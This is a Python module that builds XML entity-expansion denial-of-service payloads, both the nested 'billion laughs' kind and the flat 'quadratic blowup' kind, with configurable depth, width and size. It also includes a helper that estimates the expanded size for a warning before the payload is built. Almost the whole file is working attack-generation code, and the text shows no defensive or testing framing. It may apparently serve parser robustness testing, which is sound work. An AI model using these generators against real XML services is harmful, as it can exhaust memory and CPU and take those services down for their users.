
def _base_block(size: int) -> str:
    """Return the base string that gets multiplied during expansion."""
    return "A" * size


def build_billion_laughs(depth: int, width: int, base_size: int) -> str:
    """Build a recursive (nested) entity-expansion payload."""
    if depth < 1 or width < 1 or base_size < 1:
        raise ValueError("depth, width and base_size must all be >= 1")

    entities = [f'<!ENTITY e0 "{_base_block(base_size)}">']
    for i in range(1, depth + 1):
        refs = "".join(f"&e{i - 1};" for _ in range(width))
        entities.append(f'<!ENTITY e{i} "{refs}">')
    dtd = "\n  ".join(entities)

    return (
        '<?xml version="1.0"?>\n'
        f"<!DOCTYPE bomb [\n  {dtd}\n]>\n"
        f"<bomb>&e{depth};</bomb>"
    )


def build_quadratic(count: int, base_size: int) -> str:
    """Build a flat / single-pass entity-expansion payload."""
    if count < 1 or base_size < 1:
        raise ValueError("count and base_size must both be >= 1")

    refs = "".join("&a;" for _ in range(count))
    return (
        '<?xml version="1.0"?>\n'
        f'<!DOCTYPE bomb [\n  <!ENTITY a "{_base_block(base_size)}">\n]>\n'
        f"<bomb>{refs}</bomb>"
    )


def build_payload(xml_format: str, depth: int, width: int, base_size: int, count: int) -> str:
    """Dispatch to the requested generator by name."""
    if xml_format == "billion_laughs":
        return build_billion_laughs(depth, width, base_size)
    if xml_format == "quadratic":
        return build_quadratic(count, base_size)
    raise ValueError(f"unknown xml format {xml_format!r} (use billion_laughs or quadratic)")


def estimate_expanded_size(xml_format: str, depth: int, width: int, base_size: int, count: int) -> int:
    """Estimate expanded byte size without building it (for a pre-flight warning)."""
    if xml_format == "billion_laughs":
        return base_size * (width ** depth)
    if xml_format == "quadratic":
        return base_size * count
    raise ValueError(f"unknown xml format {xml_format!r}")


def human_size(num_bytes: int) -> str:
    """Format a byte count as a human-readable string."""
    value = float(num_bytes)
    for unit in ("B", "KB", "MB", "GB", "TB", "PB"):
        if value < 1024 or unit == "PB":
            return f"{value:.1f} {unit}"
        value /= 1024